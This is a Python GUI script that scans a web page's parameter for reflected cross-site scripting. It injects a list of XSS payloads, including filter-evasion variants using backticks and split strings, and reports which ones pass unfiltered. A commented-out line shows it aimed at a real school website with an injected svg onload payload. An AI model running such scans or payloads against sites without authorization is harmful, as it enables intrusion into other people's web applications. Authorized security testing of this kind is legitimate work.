# coding=utf-8
import requests
import re
import sys
import threading
import time
import subprocess
import urllib.parse
from requests import Session
from PyQt5.QtWidgets import QApplication , QMainWindow
from start import Ui_MainWindow

# 这两行是为了去除"请求 https 站点取消 ssl 认证时控制台的警告信息"
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


version = {'php': '', 'nginx': '', 'apache': '', 'tomcat': ''}
# keyword = {
#     'php':'PHP Version\s\S\S\S\S\S\S\S',
#     'tomcat':'Apache Tomcat\S\S\S\S\S\S\S',
#     'nginx':'nginx\/\S\S\S\S\S*',
#     'apache':'Apache\/\S*'}

targeturl = ""
urllist = []
payloadlist = []
HTTP_METHON="not know"
post_url="post 请求的 url"
post_data="post 请求的 data"
get_url="get 请求的 url"

URL = {"url":"",
       "payload":""}
keyword = ["\"'>",
           "<script>591<script>",
             "prompt(591)",
             "confirm(591)",
             "alert(591)",
             "prompt`591`",
           "window[`ale`+`rt`]`591`",
           "window[`ale`%2b`rt`]`591`",
           "window[`ale`%252b`rt`]`591`",
             "onwheel=",
             "onclick=",
             "onmouseover=",
             "onmouseout=",
             "<a>591</a>",
             "<input 591>",
           "<a%20onwheel=prompt`591`>591</a>",
           "<a/onwheel=window[`con`+`firm`]`591`>591</a>",
           "<a/onwheel=window[`con`%2b`firm`]`591`>591</a>",
           "<a/onwheel=window[`con`%252b`firm`]`591`>591</a>"
           ]
sensitive = []
unsensitive = []

# 重写 Requests 的 send 方法，对请求 url 反编码
class NoQuoteSession(requests.Session):
    def send(self, prep, **send_kwargs):
        table = {
            urllib.parse.quote('{'): '{',
            urllib.parse.quote('}'): '}',
            urllib.parse.quote(':'): ':',
            urllib.parse.quote(','): ',',
            urllib.parse.quote('<'): '<',
            urllib.parse.quote('>'): '>',
            urllib.parse.quote('"'): '"',
            urllib.parse.quote('`'): '`',
            # urllib.parse.quote(' '): ' ',
            # urllib.parse.quote('%3e'): '>'
        }
        for old, new in table.items():
            prep.url = prep.url.replace(old, new)
        # print("+++正在测试：", prep.url)
        return super().send(prep, **send_kwargs)



def get_response(url):
    print("GET测试：",url)
    r = NoQuoteSession()
    header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
              'Content-Type': 'application/x-www-form-urlencoded'}
    proxy = {"http": "http://127.0.0.1:8080",
             "https": "http://127.0.0.1:8080"}
    try:
        return r.get(url,headers = header).text
    except requests.exceptions.ConnectionError:
        return "get no Response"

def post_response(data):
    print("post_response_data:",data)
    r = NoQuoteSession()
    header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
              'Content-Type': 'application/x-www-form-urlencoded'}
    proxy = {"http": "http://127.0.0.1:8080",
             "https": "http://127.0.0.1:8080"}
    try:
        return r.post(post_url, data=data,headers=header,proxies=proxy).text
    except requests.exceptions.ConnectionError:
        return "post no Response"

def rebuild():
    global HTTP_METHON,targeturl,get_url,post_url,post_data
    word = "have_update_record"
    re_word=word+".*?&"
    re_word_2=word+".*"
    print("targeturl是",targeturl)
    # print(re_word)
    if not re.search("(POST)",targeturl):
        HTTP_METHON = "GET"
        print("Not Find POST in URL. HTTP = POST")
        if re.search(re_word,targeturl):
            # print("替换1：",re.sub(re_word,word+"="+"abcdef(1234)&",targeturl))
            get_url = re.sub(re_word, word + "=" + "abcdef(1234)&", targeturl)
            print("GET替换1：",get_url)
        else:
            # print("替换2：",re.sub(re_word_2,word+"="+"abcdef(1234)",targeturl))
            get_url = re.sub(re_word_2,word+"="+"abcdef(1234)",targeturl)
            print("GET替换2：",get_url)
    else:
        HTTP_METHON = "POST"
        print("Find POST in URL. HTTP = GET")
        url_split_list=re.split(re.escape("(POST)"),targeturl)
        post_url = url_split_list[0]
        print("分割前半段url：",post_url,"分割后半段postdata：",url_split_list[1])

        if re.search(re_word,url_split_list[1]):
            post_data = re.sub(re_word, word + "=" + "abcdef(1234)&", url_split_list[1])
            print("POST-DATA替换1：",post_data)
        else:
            post_data = re.sub(re_word_2, word + "=" + "abcdef(1234)", url_split_list[1])
            print("POST-DATA替换2：", post_data)

def prepare_check():
    global targeturl
    global HTTP_METHON
    while HTTP_METHON=="GET":
        for i in keyword:
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(i))), get_response(re.sub(re.escape("abcdef(1234)"),i,get_url))):  # 使用 re.escape()
                unsensitive.append(i)
            else:
                sensitive.append(i)
        [print("过滤：",e) for e in sensitive]
        [print("未过滤：", e) for e in unsensitive]
        break
    while HTTP_METHON=="POST":
        for i in keyword:
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(i))), post_response(re.sub(re.escape("abcdef(1234)"),i,post_data))):  # 使用 re.escape()
                unsensitive.append(i)
            else:
                sensitive.append(i)
        [print("过滤：", e) for e in sensitive]
        [print("未过滤：", e) for e in unsensitive]
        # print(post_response(re.sub(re.escape("abcdef(1234)"),"prompt(591)",post_data)))
        break



class MyMainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)

def start():
    global targeturl
    # targeturl = sys.argv[1]
    # print("lalal",myWin.input_url.text())
    try:
        targeturl = myWin.input_url.text()
    except:
        print("未获取到 url 信息")
        sys.exit(0)
    # targeturl = "http://www.no1.edu.sh.cn/NEWS/SHOW_OUT/TeacherGrowthPocket/main_style00002/school_plan_list.asp(POST)start_month=&start_year=&PLAN_ID=&order_name=e.TEACHER_PLAN_EXAMPLE_TIME&end_year=&start_day=&subject_name=&have_update_record=></a><svg/%20onload=wfzxrx(6623)>&end_month=&end_day=&grade_name=&order_direct=desc&user_id=&PLAN_NAME=&Page=2"
    # PAYLOAD["url"] = re.sub("\w{6}\(\d{4}\)",PAYLOAD["1"],targeturl)
    print("验证URL：", targeturl)
    # rebuildurl()
    # checkxss()
    # prepare_check()
    rebuild()
    prepare_check()

if __name__=="__main__":
    app = QApplication(sys.argv) #the standard way to init QT
    myWin = MyMainWindow()
    myWin.show()
    myWin.startx.clicked.connect(lambda: start())
    sys.exit(app.exec_())